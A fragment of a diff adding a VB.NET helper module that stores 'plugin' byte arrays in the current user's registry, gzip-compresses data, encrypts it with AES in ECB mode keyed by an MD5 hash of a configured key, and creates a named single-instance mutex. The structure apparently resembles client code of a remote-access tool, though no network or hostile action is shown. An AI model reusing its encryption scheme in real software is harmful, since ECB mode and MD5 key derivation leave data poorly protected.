+                    Debug.WriteLine("plugin saved")
+                    Return True
+                End Using
+
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+
+            Return False
+        End Function
+
+        Public Function GetValue(ByVal value As String) As Byte()
+            Try
+
+                Using key As RegistryKey = Registry.CurrentUser.CreateSubKey(PL)
+                    Dim o As Object = key.GetValue(value)
+                    Return CType(o, Byte())
+                End Using
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+            Return Nothing
+        End Function
+
+        Function Decompress(ByVal input As Byte()) As Byte()
+            Using source = New MemoryStream(input)
+                Dim lengthBytes As Byte() = New Byte(3) {}
+                source.Read(lengthBytes, 0, 4)
+                Dim length = BitConverter.ToInt32(lengthBytes, 0)
+
+                Using decompressionStream = New GZipStream(source, CompressionMode.Decompress)
+                    Dim result = New Byte(length - 1) {}
+                    decompressionStream.Read(result, 0, length)
+                    Return result
+                End Using
+            End Using
+        End Function
+        Function Compress(ByVal input As Byte()) As Byte()
+            Using result = New MemoryStream()
+                Dim lengthBytes = BitConverter.GetBytes(input.Length)
+                result.Write(lengthBytes, 0, 4)
+
+                Using compressionStream = New GZipStream(result, CompressionMode.Compress)
+                    compressionStream.Write(input, 0, input.Length)
+                    compressionStream.Flush()
+                End Using
+
+                Return result.ToArray()
+            End Using
+        End Function
+        Function AES_Encryptor(ByVal input As Byte()) As Byte()
+            Dim AES_ As New RijndaelManaged
+            Dim Hash As New MD5CryptoServiceProvider
+            Try
+                AES_.Key = Hash.ComputeHash(SB(Settings.KEY))
+                AES_.Mode = CipherMode.ECB
+                Dim DESEncrypter As ICryptoTransform = AES_.CreateEncryptor
+                Dim Buffer As Byte() = input
+                Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+        End Function
+
+        Function AES_Decryptor(ByVal input As Byte()) As Byte()
+            Dim AES_ As New RijndaelManaged
+            Dim Hash As New MD5CryptoServiceProvider
+            Try
+                AES_.Key = Hash.ComputeHash(SB(Settings.KEY))
+                AES_.Mode = CipherMode.ECB
+                Dim DESDecrypter As ICryptoTransform = AES_.CreateDecryptor
+                Dim Buffer As Byte() = input
+                Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+        End Function
+        Public _appMutex As Mutex
+        Public Function CreateMutex() As Boolean
+            Dim createdNew As Boolean
+            _appMutex = New Mutex(False, Settings.Mutex, createdNew)
+            Return createdNew
+        End Function
+        Public Sub CloseMutex()
+            If _appMutex IsNot Nothing Then
+                _appMutex.Close()
+                _appMutex = Nothing
+            End If
+        End Sub
+    End Module
+
+End Namespace
